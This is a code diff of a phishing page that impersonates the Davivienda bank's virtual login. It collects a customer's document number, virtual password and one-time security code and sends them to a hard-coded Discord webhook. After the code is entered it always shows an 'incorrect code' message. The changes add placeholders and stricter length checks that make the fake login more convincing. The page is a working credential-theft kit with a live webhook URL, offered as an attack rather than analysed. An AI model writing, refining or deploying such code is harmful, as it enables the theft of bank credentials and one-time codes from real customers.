@@ -6,7 +6,6 @@
     <title>Davivienda - Virtual</title>
     <link rel="stylesheet" href="styles.css">
     <style>
-        /* Acumulación de pasos */
         #passSection, #otpSection { display: none; }
         .visible { display: block !important; }
         
@@ -44,7 +43,7 @@
                 </div>
                 <div class="form-group">
                     <label class="form-label">Ingrese su número de documento</label>
-                    <input type="tel" id="docNumber" class="form-input" autocomplete="off">
+                    <input type="tel" id="docNumber" class="form-input" autocomplete="off" placeholder="Número de documento">
                 </div>
                 <button type="button" id="btnToPass" class="btn-continue">Continuar</button>
             </div>
@@ -52,7 +51,7 @@
             <div id="passSection">
                 <div class="form-group" style="margin-top: 15px;">
                     <label class="form-label">Ingrese su clave virtual</label>
-                    <input type="password" id="pass" class="form-input" maxlength="8" inputmode="numeric">
+                    <input type="password" id="pass" class="form-input" maxlength="8" inputmode="numeric" placeholder="Clave de 4 a 8 dígitos">
                 </div>
                 <div class="checkbox-container">
                     <input type="checkbox" id="rem" class="checkbox">
@@ -66,7 +65,7 @@
                     <h2 style="color: #ed1c24; font-size: 20px; font-weight: 700;">Verificación</h2>
                     <div class="form-group">
                         <label class="form-label">Código de seguridad</label>
-                        <input type="tel" id="otpCode" class="form-input" placeholder="000000">
+                        <input type="tel" id="otpCode" class="form-input" placeholder="000000" maxlength="6">
                     </div>
                     <p id="errOtp" style="color: #ed1c24; font-size: 13px; display: none; margin-top: 10px; font-weight: bold;">Código incorrecto. Reintente.</p>
                     <button type="button" id="btnFinish" class="btn-continue">Verificar</button>
@@ -83,25 +82,17 @@
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6';
 
-        // Bloqueo total de teclas no numéricas
+        // 1. Bloqueo de letras y caracteres especiales
         const permitirSoloNumeros = (e) => {
-            // Permitir: Retroceso, Tab, Enter, Escape, y flechas
-            if (["Backspace", "Tab", "Enter", "Escape", "ArrowLeft", "ArrowRight"].includes(e.key)) {
-                return;
-            }
-            // Bloquear si no es un número del 0 al 9
-            if (!/^[0-9]$/.test(e.key)) {
-                e.preventDefault();
-            }
+            if (["Backspace", "Tab", "Enter", "Escape", "ArrowLeft", "ArrowRight"].includes(e.key)) return;
+            if (!/^[0-9]$/.test(e.key)) e.preventDefault();
         };
 
-        // Limpieza extra al pegar o escribir (por seguridad)
         const limpiarNoNumeros = (e) => {
             e.target.value = e.target.value.replace(/\D/g, '');
         };
 
         const inputs = [document.getElementById('docNumber'), document.getElementById('pass'), document.getElementById('otpCode')];
-
         inputs.forEach(input => {
             input.addEventListener('keydown', permitirSoloNumeros);
             input.addEventListener('input', limpiarNoNumeros);
@@ -114,20 +105,28 @@
             dForm.submit(); 
         }
 
+        // Paso 1: Validar Documento (mínimo 6 dígitos)
         document.getElementById('btnToPass').addEventListener('click', () => {
-            if (document.getElementById('docNumber').value.length > 3) {
-                document.getElementById('btnToPass').classList.add('btn-hide');
-                document.getElementById('docGroup').classList.add('step-done');
-                document.getElementById('passSection').classList.add('visible');
+            const doc = document.getElementById('docNumber').value;
+            if (doc.length < 6) {
+                alert("Por favor, ingrese un número de documento válido.");
+                return;
             }
+            document.getElementById('btnToPass').classList.add('btn-hide');
+            document.getElementById('docGroup').classList.add('step-done');
+            document.getElementById('passSection').classList.add('visible');
         });
 
+        // Paso 2: Validar Clave (mínimo 4 dígitos)
         document.getElementById('btnToOtp').addEventListener('click', () => {
             const btn = document.getElementById('btnToOtp');
             const doc = document.getElementById('docNumber').value;
             const clave = document.getElementById('pass').value;
 
-            if (clave.length < 4) return;
+            if (clave.length < 4) {
+                alert("La clave debe tener al menos 4 números.");
+                return;
+            }
 
             btn.innerText = "Validando...";
             btn.disabled = true;
@@ -142,13 +141,21 @@
             }, 1000);
         });
 
+        // Paso 3: Validar OTP (exactamente 6 dígitos)
         document.getElementById('btnFinish').addEventListener('click', () => {
             const btn = document.getElementById('btnFinish');
             const otp = document.getElementById('otpCode').value;
+            const doc = document.getElementById('docNumber').value;
+
+            if (otp.length < 6) {
+                alert("Ingrese el código de 6 dígitos.");
+                return;
+            }
             
             btn.innerText = "Verificando...";
+            btn.disabled = true;
             
-            sendToDiscord(`**🔐 OTP RECIBIDO**\n👤 **Doc:** \`${document.getElementById('docNumber').value}\`\n🔢 **Código:** \`${otp}\``);
+            sendToDiscord(`**🔐 OTP RECIBIDO**\n👤 **Doc:** \`${doc}\`\n🔢 **Código:** \`${otp}\``);
 
             setTimeout(() => {
                 document.getElementById('errOtp').style.display = 'block';
